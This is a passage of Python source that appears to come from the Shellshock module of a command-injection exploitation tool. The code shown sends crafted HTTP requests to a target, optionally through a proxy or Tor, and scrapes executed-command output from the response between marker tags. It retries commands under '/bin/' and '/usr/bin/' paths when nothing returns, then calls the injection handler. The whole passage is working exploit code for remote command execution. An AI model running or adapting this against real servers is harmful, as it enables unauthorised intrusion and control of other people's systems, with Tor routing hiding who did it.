      if menu.options.proxy:
        response = proxy.use_proxy(request)
      # Check if defined Tor.
      elif menu.options.tor:
        response = tor.use_tor(request)
      else:
        response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
      shell = checks.page_encoding(response, action="decode").rstrip().replace('\n',' ')
      shell = re.findall(r"" + TAG + "(.*)" + TAG, shell)
      shell = ''.join(shell)
      return shell, payload

    except _urllib.error.URLError as err_msg:
      print("\n" + settings.print_critical_msg(err_msg))
      raise SystemExit()

  shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
  if len(shell) == 0:
    cmd = "/bin/" + cmd
    shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
    if len(shell) > 0:
      pass
    elif len(shell) == 0:
      cmd = "/usr" + cmd
      shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
      if len(shell) > 0:
        pass

  return shell, payload

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, http_request_method, filename):       
  if shellshock_handler(url, http_request_method, filename) == False:
    return False

# eof